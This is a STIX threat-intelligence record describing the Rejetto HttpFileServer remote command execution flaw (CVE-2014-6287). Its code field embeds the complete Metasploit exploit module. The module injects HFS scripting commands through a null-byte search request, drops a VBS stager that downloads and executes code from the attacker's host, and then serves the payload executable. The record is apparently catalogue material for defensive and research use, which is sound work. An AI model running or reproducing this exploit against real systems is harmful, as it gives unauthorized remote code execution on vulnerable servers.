{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--479c5e46-73b1-42e0-ac25-70dcb64dd437",
    "created": "2024-08-14T16:51:44.907257Z",
    "modified": "2024-08-14T16:51:44.907262Z",
    "name": "\"Rejetto HttpFileServer Remote Command Execution\"",
    "description": " Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/rejetto_hfs_exec.rb",
            "external_id": "rejetto_hfs_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6287"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2014/Sep/85"
        },
        {
            "source_name": "reference",
            "url": "http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Rejetto HttpFileServer Remote Command Execution\",\n      'Description'    => %q{\n        Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a\n        poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by\n        using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b\n        over Windows XP SP3, Windows 7 SP1 and Windows 8.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Daniele Linguaglossa <danielelinguaglossa[at]gmail.com>', # orginal discovery\n          'Muhamad Fadzil Ramli <mind1355[at]gmail.com>' # metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-6287'],\n          ['OSVDB', '111386'],\n          ['URL', 'https://seclists.org/bugtraq/2014/Sep/85'],\n          ['URL', 'http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands']\n        ],\n      'Payload'        => { 'BadChars' => \"\\x0d\\x0a\\x00\" },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n        ],\n      'Privileged'     => false,\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'DisclosureDate' => '2014-09-11',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The path of the web application', '/']),\n          OptInt.new('HTTPDELAY',    [false, 'Seconds to wait before terminating web server', 10]),\n        ])\n  end\n\n  def check\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => '/'\n    })\n\n    if res &&  res.headers['Server'] && res.headers['Server'] =~ /HFS ([\\d.]+)/\n      version = $1\n      if Rex::Version.new(version) <= Rex::Version.new(\"2.3\")\n        return Exploit::CheckCode::Detected\n      else\n        return Exploit::CheckCode::Safe\n      end\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def on_request_uri(cli, req)\n    print_status(\"Payload request received: #{req.uri}\")\n    exe = generate_payload_exe\n    vbs = Msf::Util::EXE.to_exe_vbs(exe)\n    send_response(cli, vbs, {'Content-Type' => 'application/octet-stream'})\n    # remove resource after serving 1st request as 'exec' execute 4x\n    # during exploitation\n    remove_resource(get_resource)\n  end\n\n  def autofilter\n    true\n  end\n\n  def primer\n    file_name = rand_text_alpha(rand(10)+5)\n    file_ext = '.vbs'\n    file_full_name = file_name + file_ext\n    vbs_path = \"%TEMP%\\\\#{file_full_name}\"\n\n    vbs_code = \"Set x=CreateObject(\\\"Microsoft.XMLHTTP\\\")\\x0d\\x0a\"\n    vbs_code << \"On Error Resume Next\\x0d\\x0a\"\n    vbs_code << \"x.Open \\\"GET\\\",\\\"http://#{datastore['LHOST']}:#{datastore['SRVPORT']}#{get_resource}\\\",False\\x0d\\x0a\"\n    vbs_code << \"If Err.Number <> 0 Then\\x0d\\x0a\"\n    vbs_code << \"wsh.exit\\x0d\\x0a\"\n    vbs_code << \"End If\\x0d\\x0a\"\n    vbs_code << \"x.Send\\x0d\\x0a\"\n    vbs_code << \"Execute x.responseText\"\n\n    payloads = [\n      \"save|#{vbs_path}|#{vbs_code}\",\n      \"exec|wscript.exe //B //NOLOGO #{vbs_path}\"\n    ]\n\n    print_status(\"Sending a malicious request to #{target_uri.path}\")\n    payloads.each do |payload|\n      send_request_raw({\n        'method' => 'GET',\n        'uri' => \"/?search=%00{.#{URI::encode_www_form_component(payload)}.}\"\n      })\n    end\n    register_file_for_cleanup(vbs_path)\n  end\n\n  def exploit\n    begin\n      Timeout.timeout(datastore['HTTPDELAY']) { super }\n    rescue Timeout::Error\n      # When the server stops due to our timeout, this is raised\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-11",
    "x_mitre_platforms": [
        "win'"
    ]
}